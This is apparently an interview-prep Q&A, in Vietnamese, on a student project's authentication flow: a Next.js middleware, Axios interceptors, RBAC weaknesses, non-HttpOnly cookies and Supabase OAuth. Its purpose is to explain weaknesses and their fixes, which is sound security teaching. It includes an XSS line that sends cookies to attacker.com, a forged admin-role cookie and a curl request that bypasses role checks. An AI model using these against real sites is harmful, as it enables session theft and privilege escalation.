# Interview: Authentication & Middleware

---

## Q1. Giải thích toàn bộ auth flow từ khi user nhấn Login đến khi có thể gọi API.

**Trả lời:**

```
1. User nhập email/password → submit form
         │
         ▼
2. authApi.login({ email, password })
   → POST http://localhost:5000/api/auth/login
   (qua Axios, không có token vì chưa login)
         │
         ▼
3. API Gateway proxy → auth-service (port 5001)
   auth-service: verify password bcrypt → tạo JWT
   Response:
   {
     "accessToken": "eyJ...",
     "user": { "id": "...", "email": "...", "role": "learner", "profileId": "..." }
   }
         │
         ▼
4. Frontend nhận response:
   - setCookie('accessToken', accessToken, { expires: 1 })  ← 1 ngày
   - setCookie('user', JSON.stringify(user))
   - useAuthStore.setUser(user)           ← cập nhật Zustand
   - router.push('/dashboard')            ← navigate
         │
         ▼
5. middleware.ts chạy (Edge runtime):
   - Đọc cookie 'accessToken' → tồn tại → OK
   - Đọc cookie 'user' → role === 'learner' → match /dashboard → OK
   - NextResponse.next()
         │
         ▼
6. Dashboard page render
   - AuthHydrator chạy: đọc cookie 'user' → sync Zustand (phòng ngừa)
   - useUser() trả về AuthUser object
   - React Query hooks bắt đầu fetch data
         │
         ▼
7. Mỗi API call:
   Axios interceptor đọc getCookie('accessToken')
   → config.headers.Authorization = `Bearer eyJ...`
   → request đến NestJS với header đúng
```

**Điểm quan trọng:**

- Cookie được set ở **client** (JS code), không phải Set-Cookie header từ server. Đây là vì không có HttpOnly.
- Middleware chạy ở **Edge runtime** (không có Node.js APIs) → chỉ đọc cookie, không thể decode JWT.
- JWT expiry check KHÔNG được làm ở middleware (Edge không có crypto để verify JWT). Chỉ check presence của cookie.

---

## Q2. Next.js middleware chạy ở đâu? Edge Runtime khác Node.js runtime như thế nào?

**Trả lời:**

**Edge Runtime** là môi trường JavaScript nhẹ, chạy gần user nhất (CDN edge nodes):

| Đặc điểm | Edge Runtime | Node.js Runtime |
|---|---|---|
| Vị trí | CDN edge (gần user) | Server trung tâm |
| Cold start | ~1ms | ~100ms |
| Memory limit | 128MB | Không giới hạn |
| Node.js APIs | ❌ Không có | ✅ Đầy đủ |
| Crypto (`jose`, `jsonwebtoken`) | Hạn chế | Đầy đủ |
| `fs`, `path` | ❌ | ✅ |
| Fetch API | ✅ | ✅ |
| Web APIs (Request, Response) | ✅ | ✅ |

**Vì sao middleware dùng Edge:**

Middleware chạy **trước mỗi request** → phải cực nhanh. Edge runtime cold start ~1ms vs ~100ms của Node.js. Nếu middleware chậm → mọi page load đều chậm.

**Hạn chế trong dự án:**

Middleware không thể verify JWT signature (cần `jsonwebtoken` hoặc `jose`). Nên chỉ check **cookie presence**, không check expiry:

```typescript
// middleware.ts
const token = request.cookies.get('accessToken')?.value;
// ❌ Không thể: jwt.verify(token, process.env.JWT_SECRET)
// ✅ Chỉ check: !!token

if (!token && isProtectedRoute) {
  return NextResponse.redirect(new URL('/login', request.url));
}
```

Hệ quả: một expired token vẫn pass middleware. Nhưng khi Axios gọi API với token expired → NestJS trả 401 → Axios interceptor redirect về `/login`. **Two-layer protection.**

---

## Q3. Phân tích RBAC logic trong middleware. Có lỗ hổng nào không?

**Trả lời:**

**Logic hiện tại:**

```typescript
// middleware.ts (simplified)
export function middleware(request: NextRequest) {
  const token = request.cookies.get('accessToken')?.value;
  const userCookie = request.cookies.get('user')?.value;
  const user = userCookie ? JSON.parse(userCookie) : null;  // ← LỖ HỔNG 1
  const { pathname } = request.nextUrl;

  const isAdminRoute = pathname.startsWith('/admin');
  const isLearnerRoute = ['/dashboard', '/analysis', '/schedule', '/practice']
    .some(p => pathname.startsWith(p));
  const isAuthPage = ['/login', '/register'].some(p => pathname.startsWith(p));

  // Rule 1: Protected route, no token
  if (!token && (isAdminRoute || isLearnerRoute)) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  // Rule 2: Already logged in, on auth page
  if (token && isAuthPage) {
    return NextResponse.redirect(new URL('/', request.url));
  }

  // Rule 3: Role mismatch
  if (token && user) {
    if (isAdminRoute && user.role !== 'admin') {
      return NextResponse.redirect(new URL('/', request.url));
    }
    if (isLearnerRoute && user.role !== 'learner') {
      return NextResponse.redirect(new URL('/admin/dashboard', request.url));
    }
  }

  return NextResponse.next();
}
```

**Lỗ hổng 1: JSON.parse không có try/catch**

```typescript
const user = userCookie ? JSON.parse(userCookie) : null;
// Nếu cookie bị malformed (bị tamper, encoding issue) → throw → middleware crash
// → Next.js hiển thị 500 error cho mọi request
```

Fix đúng:
```typescript
let user = null;
try {
  if (userCookie) user = JSON.parse(userCookie);
} catch { user = null; }
```

**Lỗ hổng 2: Role từ cookie không được verify**

`user.role` được đọc từ `user` cookie — cookie này do **client JS set**, không phải HttpOnly. Một attacker có thể:

```javascript
document.cookie = 'user={"id":"x","role":"admin","profileId":"y"}';
```

Sau đó access `/admin` routes → middleware thấy `role: 'admin'` → cho qua!

**Tuy nhiên**, họ vẫn không có admin `accessToken` hợp lệ → mọi NestJS API call sẽ fail 401 hoặc dữ liệu không phải của admin.

**Lỗ hổng 3: Frontend-only RBAC**

Middleware chỉ bảo vệ **Next.js pages** (UI). Nhưng API Gateway không enforce admin role → learner với valid JWT có thể gọi trực tiếp:

```bash
curl -X DELETE http://localhost:5000/api/tests/some-uuid \
  -H "Authorization: Bearer <learner-token>"
```

→ NestJS test-service sẽ chấp nhận (vì chưa có RolesGuard ở gateway).

Đây là **known issue** — được document trong `known-issues.md` và kế hoạch fix trong feature F-01.

---

## Q4. `matcher` config trong middleware là gì? Tại sao cần nó?

**Trả lời:**

```typescript
export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico|public).*)'],
};
```

Không có `matcher` → middleware chạy cho **mọi request**, kể cả:
- `/_next/static/chunks/main.js` — JavaScript bundles
- `/_next/image?url=...` — Image optimization
- `/favicon.ico`
- `/public/logo.png`

Những request này không cần auth check và rất nhiều (mỗi page load có hàng chục static assets).

**Regex giải thích:**

```
/(                            ← Start path matching
  (?!_next/static             ← Exclude: _next/static
      |_next/image            ← Exclude: _next/image  
      |favicon.ico            ← Exclude: favicon.ico
      |public)                ← Exclude: /public folder
  .*                          ← Match everything else
)
```

**Tác động performance:**

Với matcher, middleware chỉ chạy cho page navigations và API routes, không cho static files → giảm đáng kể số lần middleware thực thi → faster page loads.

---

## Q5. Axios interceptors trong dự án làm gì? Giải thích request và response interceptor.

**Trả lời:**

```typescript
// lib/api.ts
const apiClient = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000',
  timeout: 30_000,
  headers: { 'Content-Type': 'application/json' },
});

// ========== REQUEST INTERCEPTOR ==========
apiClient.interceptors.request.use(config => {
  const token = getCookie('accessToken'); // js-cookie
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

**Request interceptor** chạy **trước khi request được gửi đi**. Tự động inject Bearer token từ cookie vào mọi request. Không cần manually thêm header ở từng API call.

```typescript
// ========== RESPONSE INTERCEPTOR ==========
apiClient.interceptors.response.use(
  response => response,  // 2xx: pass through
  error => {
    if (error.response?.status === 401) {
      // Token expired hoặc invalid
      removeCookie('accessToken');
      removeCookie('user');
      window.location.href = '/login';  // Hard redirect, không dùng Next.js router
    }
    return Promise.reject(error);  // Propagate để React Query handle
  }
);
```

**Response interceptor** chạy **sau khi nhận response**. Bắt 401 (Unauthorized) → clear auth → redirect login.

**Tại sao `window.location.href` thay vì `router.push('/login')`?**

`router.push` từ Next.js `useRouter` chỉ hoạt động trong React component context. Interceptor là code JavaScript thuần, nằm ngoài React component tree. `window.location.href` là browser API, hoạt động ở bất cứ đâu. Hard redirect cũng đảm bảo app state được reset hoàn toàn.

---

## Q6. Tại sao dự án không dùng HttpOnly cookies? Rủi ro thực tế là gì?

**Trả lời:**

**HttpOnly cookie** là cookie có flag `httpOnly: true` → JavaScript không thể đọc (`document.cookie` không thấy nó). Chỉ browser tự động gửi nó theo mỗi request.

**Tại sao dự án hiện tại KHÔNG dùng HttpOnly:**

1. **Axios cần đọc token:** `getCookie('accessToken')` để attach vào `Authorization` header. Nếu HttpOnly, JavaScript không đọc được → Axios không thể tự inject.

2. **Middleware cần đọc token:** Next.js middleware đọc `request.cookies.get('accessToken')`. HttpOnly cookies vẫn được gửi kèm request → middleware đọc được! Vậy middleware OK, nhưng client-side Axios thì không.

**Fix đúng theo feature F-11:**

```typescript
// auth-service: set HttpOnly cookie trong response header
response.cookie('accessToken', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 86400000 // 24h
});

// Frontend: không cần getCookie nữa
// Axios: withCredentials: true → browser tự gửi cookie theo mỗi request
const apiClient = axios.create({
  withCredentials: true,  // ← Thay thế manual header injection
  // Xóa request interceptor inject token
});
```

**Rủi ro thực tế của hiện tại:**

XSS (Cross-Site Scripting) attack:
```javascript
// Nếu attacker inject JS vào trang (qua user input không sanitized)
const token = document.cookie; // Đọc được accessToken!
fetch('https://attacker.com/steal?token=' + token);
// Bây giờ attacker có token → giả mạo user
```

**Mức độ rủi ro trong dự án:**

Thấp-trung bình. Dự án dùng React (auto-escapes HTML) và Next.js (Content Security Policy). Nhưng nếu có third-party scripts, npm package bị compromise → XSS là possible.

Vì đây là dự án tốt nghiệp, mức độ này có thể chấp nhận được trong giai đoạn hiện tại.

---

## Q7. Giải thích Google OAuth flow trong dự án. Supabase đóng vai trò gì?

**Trả lời:**

Dự án dùng **Supabase làm OAuth provider intermediary**, không phải Google trực tiếp:

```
1. User click "Login with Google"
         │
         ▼
2. Redirect đến Supabase OAuth URL
   (Supabase xử lý Google OAuth handshake)
         │
         ▼
3. Google authenticates user
   → Redirect về Supabase callback URL
         │
         ▼
4. Supabase tạo session, cấp Supabase access token
   → Redirect về app: /auth/google/callback?access_token=...
         │
         ▼
5. app/auth/google/callback/page.tsx (Client Component)
   Đọc access_token từ URL params
   → authApi.google(accessToken)
   → POST /api/auth/google { accessToken: '<supabase-token>' }
         │
         ▼
6. API Gateway → auth-service
   auth-service:
   - Verify Supabase token với Supabase client
   - Extract email từ Supabase user object
   - findOrCreate Account (không có password field, NULL)
   - findOrCreate LearnerProfile
   - Sign platform JWT
   - Return: { accessToken: '<platform-jwt>', user: {...} }
         │
         ▼
7. Frontend: setCookie → setUser → redirect /dashboard
```

**Tại sao dùng Supabase thay vì Google trực tiếp?**

Google OAuth trực tiếp cần:
- Google Cloud Console setup
- OAuth consent screen
- Quản lý `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`
- Implement OAuth 2.0 flow (authorization code, token exchange)

Supabase làm hết những bước này → chỉ cần pass Supabase token lên backend → verify với Supabase SDK (1 line code).

**Bảo mật lưu ý:**

OAuth-only accounts có `password: null` trong database. Họ không thể login bằng email/password. Nếu sau này cần "link" OAuth với password login → cần implement riêng.
